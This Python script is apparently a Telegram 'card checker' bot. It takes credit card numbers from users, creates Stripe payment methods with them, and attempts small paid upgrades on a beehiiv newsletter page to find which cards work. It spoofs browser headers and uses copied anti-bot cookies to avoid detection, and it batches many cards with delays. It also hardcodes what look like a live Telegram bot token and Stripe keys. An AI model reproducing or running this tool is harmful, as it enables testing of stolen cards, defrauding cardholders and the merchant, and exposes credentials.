import telebot
import requests
import json
import random
import string
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
bot = telebot.TeleBot(BOT_TOKEN)

# Stripe API Keys (Keep these secure!)
STRIPE_PUBLIC_KEY = "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"
STRIPE_ACCOUNT = "acct_1P8VrT2c8u2J1Y94"  # Updated Stripe Account

# Resident Urbanist Upgrade URL
UPGRADE_URL = "https://nicdetommaso.beehiiv.com/upgrade?_data=routes%2Fupgrade"  # Updated URL

# Headers (some are dynamic and will be set later)
BASE_HEADERS = {
    "Host": "nicdetommaso.beehiiv.com",  # Updated Host
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Sec-Fetch-Site": "same-origin",
    "Origin": "https://nicdetommaso.beehiiv.com",  # Updated Origin
    "Content-Length": "370",  # Example, will be updated dynamically
    "Baggage": "sentry-environment=production,sentry-release=0547237ef3789e8ae74a6615c4e995ef3b31deee,sentry-public_key=35c3cc890abe9dbb51e6e513fcd6bbca,sentry-trace_id=29a1af691ba94ae7949a7bc51d8ad34c,sentry-sample_rate=0,sentry-transaction=routes%2Fupgrade,sentry-sampled=false",
    "Sec-Fetch-Mode": "cors",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Referer": "https://nicdetommaso.beehiiv.com/upgrade",  # Updated Referer
    "Sec-Fetch-Dest": "empty",
    "Sentry-Trace": "29a1af691ba94ae7949a7bc51d8ad34c-9214c8aa3262176d-0",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=3, i",
    "Accept-Encoding": "gzip, deflate, br",
}

# Cookies (You MUST update these with a valid set from your browser)
COOKIES = {
    "__stripe_mid": "YOUR_STRIPE_MID",
    "__stripe_sid": "YOUR_STRIPE_SID",
    "_px3": "YOUR_PX3",
    "visit_token": "YOUR_VISIT_TOKEN",
    "_pxvid": "YOUR_PXVID",
    "pxcts": "YOUR_PXCTS",
    "language": "en",
    "_bhp": "YOUR_BHP",
    "cf_clearance": "YOUR_CF_CLEARANCE",
    "__cf_bm": "YOUR_CF_BM",
}

# Function to generate a random string
def generate_random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?':
            result += random.choice(string.ascii_lowercase + string.ascii_uppercase)
        elif char == 'u':
            result += random.choice(string.ascii_uppercase)
        elif char == 'l':
            result += random.choice(string.ascii_lowercase)
        elif char == 'd':
            result += random.choice(string.digits)
        else:
            result += char
    return result

# Function to perform the GET_PM request
def get_payment_method(cc, cvv, mes, ano, email_prefix):
    url = "https://api.stripe.com/v1/payment_methods"
    payload = f"type=card&billing_details[email]={email_prefix}%40gmail.com&billing_details[address][postal_code]=10080&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=ca37b869-baff-4609-bfd3-61a2168fdef748f4b0&muid=03a73ed1-38c6-48e6-a0f1-69ac8bcdf3a9a61c51&sid=106795cc-523a-42d1-959c-c8b9db428911665224&pasted_fields=number&payment_user_agent=stripe.js%2Fb85ba7b837%3B+stripe-js-v3%2Fb85ba7b837%3B+card-element&referrer=https%3A%2F%2Fnicdetommaso.beehiiv.com&time_on_page=70570&key={STRIPE_PUBLIC_KEY}&_stripe_account={STRIPE_ACCOUNT}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Host": "api.stripe.com",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }
    try:
        response = requests.post(url, headers=headers, data=payload)
        response.raise_for_status()
        return response.json().get("id")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in GET_PM request: {e}")
        return None

# Function to perform the $5_UPGRADE request
def perform_upgrade(em_var, pm_var, email):
    url = UPGRADE_URL
    payload = f"email={em_var}%40gmail.com&force_three_d_secure=false&price_id=33af17df-aeeb-4c52-a211-d87594ee966b&premium_offer_id=&last_resource_guid=&upgrade_success_message=You+are+now+a+premium+subscriber&payment_method={pm_var}&email={email}%40gmail.com&tax_id=&tax_id_type=&amount_cents=100"
    headers = BASE_HEADERS.copy()
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=COOKIES)
        response.raise_for_status()
        logging.info(f"Upgrade Response JSON: {response.json()}")
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in $5_UPGRADE request: {e}")
        logging.error(f"Upgrade Response Text: {response.text}")
        return {"status": "error", "message": str(e)}
    except json.JSONDecodeError:
        logging.error(f"Error decoding JSON in $5_UPGRADE response. Text: {response.text}")
        return {"status": "error", "message": f"Failed to decode response: {response.text}"}

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv (single card) or one card per line for multiple checks.")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 4)
def process_single_card(message):
    try:
        cc, mm_str, yy_str, cvv = message.text.split('|')

        if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
            bot.reply_to(message, "Invalid month, year, or CVV. Please use numbers.")
            return

        mm = int(mm_str)
        yy = yy_str

        if len(yy) == 2:
            ano = f"20{yy}"
        elif len(yy) == 4:
            ano = yy
        else:
            bot.reply_to(message, "Invalid year format. Please use MM|YY or MM|YYYY.")
            return

        bot.reply_to(message, "Processing card...")
        em_var = generate_random_string("?u?l?l?l?l?l?l?l?l?l?d?d")
        email = f"SingleCheckUser{random.randint(1000, 9999)}@gmail.com"
        email_prefix = email.split('@')[0]
        pm_var = get_payment_method(cc, cvv, str(mm).zfill(2), ano, email_prefix)

        if pm_var:
            bot.reply_to(message, f"Payment Method ID obtained: {pm_var}. Now attempting upgrade...")
            upgrade_result = perform_upgrade(em_var, pm_var, email_prefix)
            time.sleep(5)  # Simulate 5-second delay

            if upgrade_result and upgrade_result.get("status") == "success":
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade successful!")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            elif upgrade_result and "error" in upgrade_result.get("status", "").lower():
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade failed.")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            else:
                bot.reply_to(message, f"Upgrade attempt failed or status could not be determined.\nRaw Response: {upgrade_result}")
        else:
            bot.reply_to(message, "Failed to obtain Payment Method ID. Card might be invalid.")

    except ValueError:
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv")
    except Exception as e:
        logging.error(f"Error processing single card input: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: '|' in message.text and '\n' in message.text)
def process_multiple_cards(message):
    cards = message.text.strip().split('\n')
    successful_checks = 0
    failed_checks = 0
    results = []

    bot.reply_to(message, f"Processing {len(cards)} cards with a 10-second delay between each...")

    for card_info in cards:
        try:
            cc, mm_str, yy_str, cvv = card_info.split('|')

            if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
                results.append(f"Card {cc[-4:]}: Invalid month, year, or CVV format.")
                failed_checks += 1
                continue

            mm = int(mm_str)
            yy = yy_str

            if len(yy) == 2:
                ano = f"20{yy}"
            elif len(yy) == 4:
                ano = yy
            else:
                results.append(f"Card {cc[-4:]}: Invalid year format.")
                failed_checks += 1
                continue

            bot.send_chat_action(message.chat.id, 'typing')
            em_var = generate_random_string("?u?l?l?l?l?l?l?l?l?l?d?d")
            email = f"MultiCheckUser{random.randint(1000, 9999)}@gmail.com"
            email_prefix = email.split('@')[0]
            pm_var = get_payment_method(cc, cvv, str(mm).zfill(2), ano, email_prefix)

            if pm_var:
                results.append(f"Card {cc[-4:]}: Payment Method ID obtained ({pm_var}). Attempting upgrade...")
                upgrade_result = perform_upgrade(em_var, pm_var, email_prefix)

                if upgrade_result and upgrade_result.get("status") == "success":
                    status_text = upgrade_result.get("status")
                    message_text = upgrade_result.get("message", "Upgrade successful!")
                    results.append(f"Card {cc[-4:]}: Upgrade Status - {status_text}, Message - {message_text}")
                    successful_checks += 1
                elif upgrade_result and "error" in upgrade_result.get("status", "").lower():
                    status_text = upgrade_result.get("status")
                    message_text = upgrade_result.get("message", "Upgrade failed.")
                    results.append(f"Card {cc[-4:]}: Upgrade Status - {status_text}, Message - {message_text}")
                    failed_checks += 1
                else:
                    results.append(f"Card {cc[-4:]}: Upgrade attempt failed or status undetermined. Raw Response: {upgrade_result}")
                    failed_checks += 1
            else:
                results.append(f"Card {cc[-4:]}: Failed to obtain Payment Method ID. Card might be invalid.")
                failed_checks += 1

        except ValueError:
            results.append("Invalid card format in one of the lines. Please use: cc|mm|yy|cvv")
            failed_checks += 1
        except Exception as e:
            logging.error(f"Error processing a card: {e}")
            results.append(f"Error processing a card: {e}")
            failed_checks += 1

        if cards.index(card_info) < len(cards) - 1:
            time.sleep(10)

    summary = f"\n--- Summary ---\nSuccessful Checks: {successful_checks}\nFailed Checks: {failed_checks}\n--- Results ---\n" + "\n".join(results)
    bot.reply_to(message, summary)

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv (single card) or one card per line for multiple checks.")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)